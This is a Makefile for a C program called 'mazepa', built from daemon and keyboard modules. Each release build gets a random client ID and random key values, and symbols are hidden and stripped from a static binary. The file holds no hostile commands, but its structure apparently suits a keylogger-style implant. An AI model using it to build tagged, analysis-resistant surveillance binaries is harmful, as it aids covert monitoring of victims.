
ifeq ($(MAKECMDGOALS), debug)
	CLIENT_ID = DEBUG
else
	CLIENT_ID  = $(shell echo $$RANDOM | md5sum | head -c 10)

	KEY   := $(shell echo $$RANDOM | md5sum | head -c 32)
	IV    := $(shell echo $$RANDOM | md5sum | head -c 8)
	BLOCK := $(shell echo $$RANDOM | md5sum | head -c 64)
endif

NAME		 	= mazepa_$(CLIENT_ID)
CC			 	= clang
RM			 	= rm -rf

INCLUDES 	 	= -I./includes/
LINK_FLAG    	=

CFLAGS 			= -Wno-unused-command-line-argument -fPIC
ifeq ($(MAKECMDGOALS), debug)
	CFLAGS 			+= -g3 -DDEBUG -Wno-format-security -Wno-visibility -DCLIENTID=DEBUG -Wno-unsafe-buffer-usage
	CFLAGS 			+= -Wno-unused-macros
else
	CFLAGS 		 	+= -Wall -Wextra -Os -Weverything -Wpedantic -Wl,-s -static -Wno-visibility
	CFLAGS 			+= -flto -m64 -fvisibility=hidden -fvisibility-inlines-hidden -s -Wno-unsafe-buffer-usage
	CFLAGS 			+= -Wno-padded -Wno-gnu-zero-variadic-macro-arguments -Wno-declaration-after-statement
	CFLAGS 			+= -DCLIENTID=$(CLIENT_ID) # -DSTATIC_KEY=$(KEY) -DBLOCK=$(BLOCK) -DIV=$(IV)
endif


PATTERN 	 	= .c
OBJPATTERN  	= .o
SRC_DIR 		= ./sources
OBJECT_DIR 		= ./objects

vpath %$(PATTERN) $(SRC_DIR)

MAIN		 	= main.c
SRC 		 	= opt.c utils.c daemon.c kbd.c


COMBINED		= $(SRC) $(MAIN)
OBJ 	 		= $(patsubst %$(PATTERN), $(OBJECT_DIR)/%$(OBJPATTERN), $(COMBINED))


.PHONY: all
all: directories $(NAME) ## generate PROD binary (you might have to run make fclean before)
	@strip -s $(NAME)
	@echo "   [*** BINARY STRIP DONE ***]"

.PHONY: help
help:
	@echo "\033[34mtargets:\033[0m"
	@perl -nle'print $& if m{^[a-zA-Z_-\d]+:.*?## .*$$}' $(MAKEFILE_LIST) | sort | awk 'BEGIN {FS = ":.*?## "}; {printf "\033[36m%-22s\033[0m %s\n", $$1, $$2}'


.PHONY: debug
debug: directories $(NAME) ## generate DEBUG binary (you might have to run make fclean before)
	@echo "[ ** DEBUG BINARY COMPILED WITH $(CFLAGS) **]"


$(OBJECT_DIR):
	@mkdir -pv $@

directories: | $(OBJECT_DIR)

$(OBJECT_DIR)/%$(OBJPATTERN) : %$(PATTERN)
	@$(CC) -o $@ -c $< $(CFLAGS) $(INCLUDES) $(LINK_FLAG)
	@echo "Compiling $@"

$(NAME): $(OBJ)
	@$(CC) -o $(NAME) $^ $(CFLAGS) $(INCLUDES) $(LINK_FLAG)
	@echo "[*** COMPILATION  SUCCESSFUL ***]"

.PHONY: clean
clean:  ## removes object files
	@$(RM) objects

.PHONY: fclean
fclean: clean  ## removes all compilation artifacts
	@$(RM) $(NAME) mazepa_*
	@echo "[*** CLEAN ***]"

.PHONY: gen-compile-commands
gen-compile-commands: clean ## generate compile_commands.json
	@bear -- make debug

.PHONY: re  ## cleans everything and rebuild PROD binary
re: fclean all


